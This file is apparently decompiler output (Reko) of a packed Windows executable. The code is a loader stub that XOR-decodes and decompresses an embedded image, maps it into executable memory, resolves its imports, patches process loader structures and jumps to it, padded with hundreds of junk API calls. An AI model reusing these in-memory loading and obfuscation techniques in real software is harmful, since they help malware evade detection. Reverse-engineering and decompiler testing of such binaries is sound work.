// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401050: void fn00401050(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn00401050(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	GetCommandLineA();
	word32 dwLoc08_10 = 0x00;
	while (dwLoc08_10 < dwArg0C)
	{
		Mem30[dwArg04 + dwLoc08_10:byte] = Mem0[dwArg08 + dwLoc08_10:byte];
		dwLoc08_10 = dwLoc08_10 + 0x01;
	}
}

// 00401190: Register DWORD Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 esp_17;
	word32 ebp_18;
	byte SCZO_19;
	word32 ebx_20;
	word32 esi_21;
	word32 edi_22;
	word32 eax_23;
	byte SZO_24;
	byte C_25;
	byte Z_26;
	word32 ecx_27;
	word32 edx_28;
	selector fs_29;
	COMCTL32.dll!Ordinal_17();
	word32 eax_33 = GetModuleHandleA(0x00);
	if (RegOpenKeyA(0x80000002, 0x00408FA0, fp - 0x1C) == 0x00)
	{
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		if ((dwArg04 & 0xFFFF) != 0x00)
			Mem333[0x00409044:word32] = 0x00;
		else
			Mem334[0x00409044:word32] = 0x01;
		if (Mem0[0x00409044:word32] != 0x00)
			Mem332[0x00409034:word32] = dwArg04;
		word32 edx_199 = Mem0[0x00405000:word32];
		word32 ecx_202 = Mem0[0x00405004:word32];
		word32 dwLoc08_204 = 0x00;
		while (dwLoc08_204 <u edx_199)
		{
			Mem218[dwLoc08_204 + 0x00405008:word32] = Mem0[dwLoc08_204 + 0x00405008:word32] ^ 11111;
			dwLoc08_204 = dwLoc08_204 + 0x08;
		}
		word32 ebp_284;
		Mem225[fp - 0x4C + 0x00:word32] = ecx_202;
		Mem229[0x00409040:word32] = fn00402020(dwArg00);
		Mem232[fp - 0x4C + 0x00:word32] = edx_199;
		Mem235[fp - 0x50 + 0x00:word32] = Mem232[0x00409040:word32];
		Mem240[fp - 0x54 + 0x00:word32] = 0x00405008;
		fn004021D0(dwArg00, dwArg04, dwArg08);
		Mem244[0x00409030:word32] = edi_22;
		Mem245[4231212:word32] = esi_21;
		Mem246[0x0040903C:word32] = ebx_20;
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		Mem277[0x00409048:word32] = Mem246[fs_29:0x18:word32];
		Mem281[4231224:word32] = fp - 0x04;
		if (Mem281[0x00409044:word32] != 0x00)
		{
			Mem311[fp - 0x4C + 0x00:word32] = dwArg04;
			Mem316[fp - 0x50 + 0x00:word32] = 4199879 - dwArg04;
			ebp_284 = fn00402050(dwArg00, dwArg04);
		}
		else
		{
			Mem322[fp - 0x4C + 0x00:word32] = eax_33;
			Mem327[fp - 0x50 + 0x00:word32] = 4199879 - eax_33;
			ebp_284 = fn00402050(dwArg00, dwArg04);
		}
		Mem288[fp - 0x4C + 0x00:word32] = Mem281[0x00409040:word32];
		word32 eax_289 = fn00401620(ebp_284, dwArg00);
		word32 esp_296;
		word32 ebp_297;
		byte SCZO_298;
		word32 ebx_299;
		word32 esi_300;
		word32 edi_301;
		word32 eax_302;
		byte SZO_303;
		byte C_304;
		byte Z_305;
		word32 ecx_306;
		word32 edx_307;
		selector fs_308;
		Mem288[0x0040904C:word32]();
		return eax_302;
	}
	else
	{
		Mem67[fp - 0x4C + 0x00:word32] = 0x00;
		Mem69[fp - 0x50 + 0x00:word32] = 0x004010D0;
		Mem71[fp - 0x54 + 0x00:word32] = 0x00;
		Mem73[fp - 88 + 0x00:word32] = 1000;
		Mem76[fp - 0x5C + 0x00:word32] = eax_33;
		DialogBoxParamA(Mem76[fp - 0x5C + 0x00:HINSTANCE], Mem76[fp - 88 + 0x00:LPCSTR], Mem76[fp - 0x54 + 0x00:HWND], Mem76[fp - 0x50 + 0x00:DLGPROC], Mem76[fp - 0x4C + 0x00:LPARAM]);
		return 0x00;
	}
}

// 00401600: Register word32 fn00401600(Stack word32 dwArg04, Stack word32 dwArg08)
word32 fn00401600(word32 dwArg04, word32 dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

// 00401620: Register word32 fn00401620(Register word32 ebp, Stack word32 dwArg04)
word32 fn00401620(word32 ebp, word32 dwArg04)
{
	word32 eax_207;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x3C:word32];
	word32 dwLoc24_123 = edx_16 + 0x18 + (word32) Mem0[edx_16 + 0x14:word16];
	word32 eax_33 = VirtualAlloc(0x00, Mem0[edx_16 + 0x50:word32], 0x3000, 0x40);
	if (eax_33 == 0x00)
	{
		eax_207 = 0x00;
		return eax_207;
	}
	fn00401050(eax_33, dwArg04, Mem0[dwArg04 + 0x3C:word32] + 0x0138 + (word32) Mem0[edx_16 + 0x06:word16] *s 0x28);
	word32 dwLoc0C_116 = 0x00;
	while (dwLoc0C_116 <u (word32) Mem0[edx_16 + 0x06:word16])
	{
		if (Mem0[dwLoc24_123 + 0x14:word32] != 0x00 && Mem0[dwLoc24_123 + 0x10:word32] != 0x00)
			fn00401050(eax_33 + Mem0[dwLoc24_123 + 0x0C:word32], dwArg04 + Mem0[dwLoc24_123 + 0x14:word32], (uint32) ((uint64) (uint32) (Mem0[dwLoc24_123 + 0x10:word32] - 0x01 + Mem0[edx_16 + 0x3C:word32]) /u Mem0[edx_16 + 0x3C:word32]) *s Mem0[edx_16 + 0x3C:word32]);
		dwLoc24_123 = dwLoc24_123 + 0x28;
		dwLoc0C_116 = dwLoc0C_116 + 0x01;
	}
	word32 ecx_187 = eax_33 + Mem0[eax_33 + 0x3C:word32];
	word32 esp_201 = fp - 0x7C;
	word32 eax_203 = CreateFileMappingA(~0x00, 0x00, 0x04, 0x00, Mem0[ecx_187 + 0x50:word32], 0x00);
	if (eax_203 == 0x00)
	{
		eax_207 = 0x00;
		return eax_207;
	}
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	GetCommandLineA();
	word32 dwLoc44_402 = eax_33 + Mem0[ecx_187 + 0x80:word32];
	while (Mem0[dwLoc44_402 + 0x10:word32] != 0x00)
	{
		word32 dwLoc30_428;
		word32 dwLoc20_427;
		word32 esp_420 = esp_201 - 0x04;
		Mem421[esp_420 + 0x00:word32] = eax_33 + Mem0[dwLoc44_402 + 0x0C:word32];
		word32 eax_422 = LoadLibraryA(Mem421[esp_420 + 0x00:LPCSTR]);
		if (Mem421[dwLoc44_402 + 0x00:word32] != 0x00)
		{
			dwLoc20_427 = eax_33 + Mem421[dwLoc44_402 + 0x00:word32];
			dwLoc30_428 = eax_33 + Mem421[dwLoc44_402 + 0x10:word32];
		}
		else
		{
			dwLoc20_427 = eax_33 + Mem421[dwLoc44_402 + 0x10:word32];
			dwLoc30_428 = eax_33 + Mem421[dwLoc44_402 + 0x00:word32];
		}
		word32 dwLoc14_431 = 0x00;
		if (Mem421[dwLoc44_402 + 0x10:word32] != 0x00 && Mem421[dwLoc44_402 + 0x00:word32] != 0x00)
			dwLoc14_431 = 0x01;
		while (true)
		{
			esp_201 = esp_420;
			if (Mem421[dwLoc20_427 + 0x00:word32] == 0x00)
				break;
			if ((Mem421[dwLoc20_427 + 0x00:word32] & 0x80000000) != 0x00)
			{
				Mem484[esp_420 - 0x04 + 0x00:word32] = Mem421[dwLoc20_427 + 0x00:word32] & 0x7FFFFFFF;
				Mem487[esp_420 - 0x08 + 0x00:word32] = eax_422;
				Mem493[dwLoc20_427 + 0x00:word32] = fn00401600(dwArg00, dwArg04);
			}
			else
			{
				Mem499[esp_420 - 0x04 + 0x00:word32] = Mem421[dwLoc20_427 + 0x00:word32] + 0x02 + eax_33;
				Mem502[esp_420 - 0x08 + 0x00:word32] = eax_422;
				Mem507[dwLoc20_427 + 0x00:word32] = fn00401600(dwArg00, dwArg04);
			}
			if (Mem421[dwLoc20_427 + 0x00:word32] == 0x00)
			{
				eax_207 = 0x00;
				return eax_207;
			}
			if (dwLoc14_431 != 0x00)
				Mem477[dwLoc30_428 + 0x00:word32] = Mem421[dwLoc20_427 + 0x00:word32];
			dwLoc20_427 = dwLoc20_427 + 0x04;
			dwLoc30_428 = dwLoc30_428 + 0x04;
		}
		dwLoc44_402 = dwLoc44_402 + 0x14;
	}
	if (Mem0[0x00409044:word32] != 0x00)
	{
		word32 edx_886 = Mem0[0x00409034:word32] - Mem0[ecx_187 + 0x34:word32];
		if (Mem0[ecx_187 + 0xA4:word32] != 0x00)
		{
			word32 dwLoc1C_895 = eax_33 + Mem0[ecx_187 + 0xA0:word32];
			while (Mem0[dwLoc1C_895 + 0x04:word32] != 0x00)
			{
				word32 edx_910 = Mem0[dwLoc1C_895 + 0x04:word32] - 0x08 >>u 0x01;
				word32 eax_913 = dwLoc1C_895 + 0x08;
				word32 dwLoc0C_916 = 0x00;
				while (dwLoc0C_916 <u edx_910)
				{
					if ((word32) eax_913[dwLoc0C_916 * 0x02] >> 0x0C == 0x03)
						Mem957[eax_33 + Mem0[dwLoc1C_895 + 0x00:word32] + ((word32) eax_913[dwLoc0C_916 * 0x02] & 0x0FFF):word32] = Mem0[eax_33 + Mem0[dwLoc1C_895 + 0x00:word32] + ((word32) eax_913[dwLoc0C_916 * 0x02] & 0x0FFF):word32] + edx_886;
					dwLoc0C_916 = dwLoc0C_916 + 0x01;
				}
				dwLoc1C_895 = dwLoc1C_895 + Mem0[dwLoc1C_895 + 0x04:word32];
			}
		}
	}
	word32 esp_545 = esp_201 - 0x04;
	Mem546[esp_545 + 0x00:word32] = 0x00408FB8;
	Mem548[esp_545 - 0x04 + 0x00:word32] = 4231112;
	Mem551[esp_545 - 0x08 + 0x00:word32] = GetModuleHandleA(Mem548[esp_545 - 0x04 + 0x00:LPCSTR]);
	word32 eax_552 = GetProcAddress(Mem551[esp_545 - 0x08 + 0x00:HMODULE], Mem551[esp_545 - 0x04 + 0x00:LPCSTR]);
	if (Mem551[0x00409044:word32] != 0x00)
	{
		Mem835[esp_545 - 0x0C + 0x00:word32] = Mem551[0x00409034:word32];
		Mem837[esp_545 - 0x10 + 0x00:word32] = 0x00;
		Mem839[esp_545 - 0x14 + 0x00:word32] = 0x00;
		Mem841[esp_545 - 0x18 + 0x00:word32] = 0x00;
		Mem843[esp_545 - 0x1C + 0x00:word32] = 0x22;
		Mem846[esp_545 - 0x20 + 0x00:word32] = eax_203;
		Mem857[0x00409028:word32] = eax_552();
	}
	else
	{
		Mem861[esp_545 - 0x0C + 0x00:word32] = Mem551[ecx_187 + 0x34:word32];
		Mem863[esp_545 - 0x10 + 0x00:word32] = 0x00;
		Mem865[esp_545 - 0x14 + 0x00:word32] = 0x00;
		Mem867[esp_545 - 0x18 + 0x00:word32] = 0x00;
		Mem869[esp_545 - 0x1C + 0x00:word32] = 0x22;
		Mem872[esp_545 - 0x20 + 0x00:word32] = eax_203;
		Mem883[0x00409028:word32] = eax_552();
	}
	word32 esp_563 = esp_201 - 0x24;
	if (Mem551[0x00409028:word32] == 0x00)
	{
		word32 esp_644;
		Mem616[esp_563 - 0x04 + 0x00:word32] = 0x00408FD8;
		Mem618[esp_563 - 0x08 + 0x00:word32] = 4231144;
		Mem621[esp_563 - 0x0C + 0x00:word32] = GetModuleHandleA(Mem618[esp_563 - 0x08 + 0x00:LPCSTR]);
		word32 eax_622 = GetProcAddress(Mem621[esp_563 - 0x0C + 0x00:HMODULE], Mem621[esp_563 - 0x08 + 0x00:LPCSTR]);
		Mem625[esp_563 - 0x10 + 0x00:word32] = 0x00408FF8;
		Mem627[esp_563 - 0x14 + 0x00:word32] = 0x00409004;
		Mem630[esp_563 - 0x18 + 0x00:word32] = GetModuleHandleA(Mem627[esp_563 - 0x14 + 0x00:LPCSTR]);
		word32 eax_631 = GetProcAddress(Mem630[esp_563 - 0x18 + 0x00:HMODULE], Mem630[esp_563 - 0x14 + 0x00:LPCSTR]);
		if (Mem630[0x00409044:word32] != 0x00)
		{
			Mem739[esp_563 - 0x1C + 0x00:word32] = Mem630[0x00409034:word32];
			esp_644 = esp_563 - 0x1C;
			if (eax_622() == 0x00)
			{
				Mem765[esp_563 - 0x20 + 0x00:word32] = 0x8000;
				Mem767[esp_563 - 0x24 + 0x00:word32] = 0x00;
				Mem771[esp_563 - 0x28 + 0x00:word32] = Mem767[0x00409034:word32];
				esp_644 = esp_563 - 0x28;
				if (eax_631() == 0x00)
				{
					eax_207 = 0x00;
					return eax_207;
				}
			}
		}
		else
		{
			Mem793[esp_563 - 0x1C + 0x00:word32] = Mem630[ecx_187 + 0x34:word32];
			esp_644 = esp_563 - 0x1C;
			if (eax_622() == 0x00)
			{
				Mem808[esp_563 - 0x20 + 0x00:word32] = 0x8000;
				Mem810[esp_563 - 0x24 + 0x00:word32] = 0x00;
				Mem815[esp_563 - 0x28 + 0x00:word32] = Mem810[ecx_187 + 0x34:word32];
				esp_644 = esp_563 - 0x28;
				if (eax_631() == 0x00)
				{
					eax_207 = 0x00;
					return eax_207;
				}
			}
		}
		if (Mem630[0x00409044:word32] != 0x00)
		{
			word32 esp_687 = esp_644 - 0x04;
			Mem688[esp_687 + 0x00:word32] = Mem630[0x00409034:word32];
			Mem690[esp_687 - 0x04 + 0x00:word32] = 0x00;
			Mem692[esp_687 - 0x08 + 0x00:word32] = 0x00;
			Mem694[esp_687 - 0x0C + 0x00:word32] = 0x00;
			Mem696[esp_687 - 0x10 + 0x00:word32] = 0x22;
			Mem699[esp_687 - 0x14 + 0x00:word32] = eax_203;
			Mem710[0x00409028:word32] = eax_552();
		}
		else
		{
			word32 esp_713 = esp_644 - 0x04;
			Mem714[esp_713 + 0x00:word32] = Mem630[ecx_187 + 0x34:word32];
			Mem716[esp_713 - 0x04 + 0x00:word32] = 0x00;
			Mem718[esp_713 - 0x08 + 0x00:word32] = 0x00;
			Mem720[esp_713 - 0x0C + 0x00:word32] = 0x00;
			Mem722[esp_713 - 0x10 + 0x00:word32] = 0x22;
			Mem725[esp_713 - 0x14 + 0x00:word32] = eax_203;
			Mem736[0x00409028:word32] = eax_552();
		}
		esp_563 = esp_644 - 0x18;
		if (Mem630[0x00409028:word32] == 0x00)
		{
			if (Mem630[0x00409044:word32] == 0x00)
			{
				Mem660[esp_563 - 0x04 + 0x00:word32] = 0x40;
				Mem662[esp_563 - 0x08 + 0x00:word32] = 0x3000;
				Mem666[esp_563 - 0x0C + 0x00:word32] = Mem662[ecx_187 + 0x50:word32];
				Mem670[esp_563 - 0x10 + 0x00:word32] = Mem666[ecx_187 + 0x34:word32];
				Mem672[0x00409028:word32] = VirtualAlloc(Mem670[esp_563 - 0x10 + 0x00:LPVOID], Mem670[esp_563 - 0x0C + 0x00:SIZE_T], Mem670[esp_563 - 0x08 + 0x00:DWORD], Mem670[esp_563 - 0x04 + 0x00:DWORD]);
				esp_563 = esp_563 - 0x10;
			}
			else
			{
				Mem674[esp_563 - 0x04 + 0x00:word32] = 0x40;
				Mem676[esp_563 - 0x08 + 0x00:word32] = 0x3000;
				Mem680[esp_563 - 0x0C + 0x00:word32] = Mem676[ecx_187 + 0x50:word32];
				Mem683[esp_563 - 0x10 + 0x00:word32] = Mem680[0x00409034:word32];
				Mem685[0x00409028:word32] = VirtualAlloc(Mem683[esp_563 - 0x10 + 0x00:LPVOID], Mem683[esp_563 - 0x0C + 0x00:SIZE_T], Mem683[esp_563 - 0x08 + 0x00:DWORD], Mem683[esp_563 - 0x04 + 0x00:DWORD]);
				esp_563 = esp_563 - 0x10;
			}
		}
	}
	word32 esp_576 = esp_563 - 0x04;
	Mem577[esp_576 + 0x00:word32] = Mem551[ecx_187 + 0x50:word32];
	Mem580[esp_576 - 0x04 + 0x00:word32] = eax_33;
	Mem583[esp_576 - 0x08 + 0x00:word32] = Mem580[0x00409028:word32];
	fn00401050(dwArg00, dwArg04, dwArg08);
	if (Mem583[0x00409044:word32] != 0x00)
	{
		Mem604[esp_576 + 0x00:word32] = Mem583[0x00409028:word32] + Mem583[ecx_187 + 0x28:word32];
		Mem607[esp_576 - 0x04 + 0x00:word32] = Mem604[0x00409034:word32];
		fn00401FB0(dwArg00, dwArg04);
	}
	else
	{
		Mem612[esp_576 + 0x00:word32] = Mem583[0x00409028:word32];
		fn004021A0(dwArg00);
	}
	Mem593[0x0040904C:word32] = Mem583[0x00409028:word32] + Mem583[ecx_187 + 0x28:word32];
	Mem596[ecx_187 + 0x28:word32] = Mem593[0x0040904C:word32];
	eax_207 = 0x01;
	return eax_207;
}

// 00401FB0: void fn00401FB0(Stack word32 dwArg04, Stack word32 dwArg08)
void fn00401FB0(word32 dwArg04, word32 dwArg08)
{
	word32 ecx_14 = Mem0[Mem0[Mem0[Mem0[0x00409048:word32] + 0x30:word32] + 0x0C:word32] + 0x0C:word32];
	word32 dwLoc0C_15 = ecx_14;
	while (0x01 != 0x00 && dwLoc0C_15 != 0x00)
	{
		if (Mem0[dwLoc0C_15 + 0x18:word32] == dwArg04)
		{
			Mem50[dwLoc0C_15 + 0x1C:word32] = dwArg08;
			return;
		}
		word32 eax_53 = Mem0[dwLoc0C_15 + 0x00:word32];
		dwLoc0C_15 = eax_53;
		if (eax_53 == ecx_14)
			return;
	}
}

// 00402020: Register word32 fn00402020(Stack word32 dwArg04)
word32 fn00402020(word32 dwArg04)
{
	return HeapAlloc(GetProcessHeap(), 0x00, dwArg04);
}

// 00402050: Register word32 fn00402050(Stack word32 dwArg04, Stack word32 dwArg08)
word32 fn00402050(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc20_13;
	if (Mem0[0x00409044:word32] != 0x00)
		dwLoc20_13 = Mem0[0x00409034:word32];
	else
		dwLoc20_13 = dwArg08;
	word32 eax_16 = dwLoc20_13 + Mem0[dwLoc20_13 + 0x3C:word32];
	Mem29[0x00409028:word32] = VirtualAlloc(0x00, Mem0[eax_16 + 0x50:word32], 0x3000, 0x40);
	if (Mem29[0x00409028:word32] != 0x00)
	{
		word32 eax_72 = Mem29[0x00409028:word32];
		fn00401050(eax_72, dwLoc20_13, Mem29[eax_16 + 0x50:word32]);
		word32 ecx_77 = Mem29[0x00409028:word32] - dwLoc20_13;
		if (Mem29[eax_16 + 0xA4:word32] != 0x00)
		{
			word32 dwLoc0C_104 = dwLoc20_13 + Mem29[eax_16 + 0xA0:word32];
			while (Mem29[dwLoc0C_104 + 0x04:word32] != 0x00)
			{
				word32 ecx_119 = Mem29[dwLoc0C_104 + 0x04:word32] - 0x08 >>u 0x01;
				word32 edx_122 = dwLoc0C_104 + 0x08;
				word32 dwLoc08_125 = 0x00;
				while (dwLoc08_125 <u ecx_119)
				{
					if ((word32) edx_122[dwLoc08_125 * 0x02] >> 0x0C == 0x03)
						Mem166[Mem29[0x00409028:word32] + Mem29[dwLoc0C_104 + 0x00:word32] + ((word32) edx_122[dwLoc08_125 * 0x02] & 0x0FFF):word32] = Mem29[Mem29[0x00409028:word32] + Mem29[dwLoc0C_104 + 0x00:word32] + ((word32) edx_122[dwLoc08_125 * 0x02] & 0x0FFF):word32] + ecx_77;
					dwLoc08_125 = dwLoc08_125 + 0x01;
				}
				dwLoc0C_104 = dwLoc0C_104 + Mem29[dwLoc0C_104 + 0x04:word32];
			}
		}
		word32 edx_88 = dwArg04 + Mem29[0x00409028:word32];
		word32 esp_90;
		word32 ebp_91;
		byte SCZO_92;
		word32 esi_93;
		byte Z_94;
		word32 eax_95;
		word32 ecx_96;
		word32 edx_97;
		byte C_98;
		byte SZO_99;
		edx_88();
		return ebp_91;
	}
	else
		return ebp;
}

// 004021A0: void fn004021A0(Stack word32 dwArg04)
void fn004021A0(word32 dwArg04)
{
	Mem13[Mem0[Mem0[0x00409048:word32] + 0x30:word32] + 0x08:word32] = dwArg04;
}

// 004021D0: Register word32 fn004021D0(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
word32 fn004021D0(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 dwLoc0C_116 = 0x01;
	byte cl_12 = Mem0[dwArg04 + 0x00:byte];
	word32 dwLoc18_122 = 0x00;
	do
	{
		word32 ecx_111;
		word32 ecx_34 = dwLoc0C_116 + 0x01;
		byte al_31 = Mem0[dwArg04 + dwLoc0C_116:byte];
		dwLoc0C_116 = ecx_34;
		if ((word32) al_31 == (word32) cl_12)
		{
			word32 ecx_59 = dwArg04 + ecx_34;
			if ((word32) Mem0[ecx_59 + 0x00:byte] == 0x00)
			{
				Mem81[dwArg08 + dwLoc18_122:byte] = cl_12;
				ecx_111 = DPB(ecx_59, cl_12, 0);
				dwLoc18_122 = dwLoc18_122 + 0x01;
				dwLoc0C_116 = ecx_34 + 0x01;
			}
			else
			{
				word32 ecx_97;
				word32 eax_100 = fn004022D0(fp - 0x10, dwArg04 + ecx_34, out ecx_97) + ecx_34;
				dwLoc0C_116 = fn004022D0(fp - 0x20, dwArg04 + eax_100, out ecx_111) + eax_100;
				word32 dwLoc1C_117 = 0x00;
				while (dwLoc1C_117 <u dwLoc10)
				{
					word32 ecx_129 = dwLoc18_122 - dwLoc20;
					byte cl_133 = Mem0[dwArg08 + ecx_129:byte];
					Mem135[dwArg08 + dwLoc18_122:byte] = cl_133;
					ecx_111 = DPB(ecx_129, cl_133, 0);
					dwLoc18_122 = dwLoc18_122 + 0x01;
					dwLoc1C_117 = dwLoc1C_117 + 0x01;
				}
			}
		}
		else
		{
			Mem148[dwArg08 + dwLoc18_122:byte] = al_31;
			ecx_111 = DPB(dwLoc0C_116 + 0x01, al_31, 0);
			dwLoc18_122 = dwLoc18_122 + 0x01;
		}
	} while (dwLoc0C_116 <u dwArg0C);
	return ecx_111;
}

// 004022D0: Register word32 fn004022D0(Stack word32 dwArg04, Stack word32 dwArg08, Register out ptr32 ecxOut)
word32 fn004022D0(word32 dwArg04, word32 dwArg08, ptr32 & ecxOut)
{
	word32 dwLoc08_12 = 0x00;
	word32 dwLoc10_13 = 0x00;
	do
	{
		word32 ecx_16 = (word32) Mem0[dwArg08 + 0x00:byte];
		word32 eax_25 = dwLoc08_12 << 0x07 | ecx_16 & 0x7F;
		word32 edx_28 = dwLoc10_13 + 0x01;
		dwArg08 = dwArg08 + 0x01;
		dwLoc08_12 = eax_25;
		dwLoc10_13 = edx_28;
	} while ((ecx_16 & 0x80) != 0x00);
	Mem38[dwArg04 + 0x00:word32] = eax_25;
	word32 ecx_36;
	*ecxOut = dwArg04;
	return edx_28;
}

